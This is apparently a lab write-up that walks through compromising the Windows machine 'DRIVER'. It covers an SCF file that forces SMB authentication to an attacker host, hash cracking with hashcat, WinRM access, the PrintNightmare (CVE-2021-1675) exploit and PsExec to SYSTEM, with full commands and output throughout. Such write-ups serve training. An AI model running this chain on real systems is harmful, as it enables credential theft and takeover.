## Enumeration

I started with a standard Nmap scan to identify the exposed services.

```text
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

The target exposes a web server, SMB, MSRPC, and WinRM. Since SMB and WinRM are both commonly useful during Windows enumeration, I kept those services in mind while inspecting the web application.

### Web Enumeration

The web application exposes a login page. The credentials:

```text
admin:admin
```

were accepted successfully.

However, the web application did not immediately provide a way to execute commands or obtain a shell, so I continued enumerating the other exposed services.

---

## Initial Access

### SCF File Attack

Since SMB was exposed, I investigated whether the target could be induced to authenticate to an SMB server under my control.

A useful technique for this scenario is an SCF (Shell Command File) attack. SCF files can reference remote resources, including icons hosted over SMB. If Windows attempts to retrieve such a resource, it may initiate an SMB authentication request.

I created the following file:

```ini
[Shell]
Command=2
IconFile=\\10.10.14.245\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

The relevant part is the `IconFile` directive:

```text
IconFile=\\10.10.14.245\share\test.ico
```

The objective is not to retrieve the icon itself. Instead, the remote UNC path causes Windows to attempt an SMB connection to the attacker-controlled host.

I then started Responder and uploaded the SCF file to the target.

### Cracking the NTLMv2 Response

The captured value is not the plaintext password. However, NTLMv2 responses can be tested offline against a wordlist.

I used Hashcat with mode `5600`:

```bash
hashcat -m 5600 tony_ntml.hash /usr/share/wordlists/rockyou.txt
```

The password was recovered as:

```text
liltony
```

At this point I had:

```text
Username: DRIVER\tony
Password: liltony
```

The next step was to determine whether these credentials could be used for remote access.

## WinRM Access

Port `5985` was identified during the initial Nmap scan, indicating that WinRM was available.

I tested the recovered credentials:

```text
cme winrm 10.129.49.67 -u tony -p 'liltony'
```

The result confirmed that the credentials were valid:

```text
SMB         10.129.49.67    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.129.49.67    5985   DRIVER           [*] http://10.129.49.67:5985/wsman
WINRM       10.129.49.67    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

I then established a WinRM session using Evil-WinRM:

```bash
evil-winrm -i 10.129.49.67 -u tony -p liltony
```

The session confirmed that I was operating as the `tony` user:

```
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
```

The initial access chain was therefore:

```text
SCF file
    |
    v
SMB authentication
    |
    v
NTLMv2 challenge-response
    |
    v
Offline password cracking
    |
    v
DRIVER\tony
    |
    v
WinRM
```

# Privilege Escalation

With an interactive shell as `tony`, I started looking for a way to escalate privileges.

I uploaded WinPEAS:

```powershell
upload /home/kali/tools/Windows/WinPeas/winPEASany.exe
```

During the enumeration, the Print Spooler service and its RPC interfaces were particularly interesting.

I enumerated the RPC endpoints and found:

```text
Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
Bindings:
          ncacn_ip_tcp:10.129.49.67[49410]
          ncalrpc:[LRPC-599af79928480b0d85]
```

The presence of the Microsoft Print System Remote Protocol (`MS-RPRN`) exposed by `spoolsv.exe` is relevant because the target is vulnerable to CVE-2021-1675, commonly associated with PrintNightmare.

## PrintNightmare

I used the NightMare PowerShell implementation to interact with the vulnerable Print Spooler functionality.

Initially, executing the script directly from disk resulted in an Execution Policy error because PowerShell was configured with:

```text
Restricted
```

Instead of executing the `.ps1` file directly from the remote filesystem, I used Evil-WinRM's script directory functionality:

```bash
evil-winrm -i 10.129.49.67 -u tony -p liltony -s ~/tools/Windows/NightMare/
```

The script could then be loaded into the PowerShell session:

```powershell
CVE-2021-1675.ps1
```

Running `menu` confirmed that the functions from the script had been imported:

```text
[+] Add-Win32Type
[+] field
[+] func
[+] get_nightmare_dll
[+] Invoke-Nightmare
[+] New-InMemoryModule
[+] psenum
[+] struct
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] clear
[+] cls
[+] menu
[+] exit
```

The relevant function was `Invoke-Nightmare`.

I executed it:

```powershell
Invoke-Nightmare
```

The output showed that the exploit successfully performed the privileged operation:

```text
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

The important part is:

```text
[+] added user as local administrator
```

The exploit did not simply change the privileges of `tony`. Instead, it used the privileged Print Spooler context to create the `adm1n` account and add it to the local Administrators group.

The privilege transition can therefore be represented as:

```text
DRIVER\tony
    |
    | CVE-2021-1675 / PrintNightmare
    v
DRIVER\adm1n
Local Administrator
```

At this point, I had obtained a privileged local account.

# From Administrator to SYSTEM

The next step was to use the newly created administrator account.

The credentials provided by the exploit were:

```text
Username: adm1n
Password: P@ssw0rd
```

I used Impacket's PsExec implementation:

```bash
impacket-psexec adm1n@10.129.49.67
```

After authentication, Impacket performed the following operations:

```text
[*] Requesting shares on 10.129.49.67.....
[*] Found writable share ADMIN$
[*] Uploading file YjQyjeAm.exe
[*] Opening SVCManager on 10.129.49.67.....
[*] Creating service MLzD on 10.129.49.67.....
[*] Starting service MLzD.....
```

This is a separate privilege transition from the PrintNightmare exploitation.

At this stage, `adm1n` was already a local administrator. PsExec uses the administrator's ability to interact with the Service Control Manager and create a Windows service. The service is executed under the `LocalSystem` account.

Finally, I verified the context:

```
C:\Windows\system32> whoami
nt authority\system
```
